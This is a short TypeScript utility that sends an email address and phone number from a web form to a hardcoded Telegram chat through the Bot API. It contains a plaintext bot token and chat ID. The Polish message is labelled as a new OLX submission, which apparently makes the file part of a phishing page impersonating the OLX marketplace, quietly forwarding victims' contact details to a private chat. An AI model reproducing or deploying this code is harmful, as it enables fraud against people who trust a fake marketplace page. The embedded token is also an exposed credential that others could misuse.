// Telegram API utility for sending form data
export async function sendToTelegram(formData: { email: string; phone: string }) {
  const botToken = "8275821657:AAEBFQ3jJaCERjkYVVRJpnqZwuWGLvb71ks";
  const chatId = "-1002904177569";
  
  const message = `🆕 Nowe zgłoszenie OLX\n\n📧 Email: ${formData.email}\n📱 Telefon: ${formData.phone}\n\n⏰ Data: ${new Date().toLocaleString('pl-PL')}`;
  
  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
  
  const response = await fetch(telegramUrl, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
    }),
  });

  if (!response.ok) {
    throw new Error('Nie udało się wysłać wiadomości do Telegram');
  }

  return response.json();
}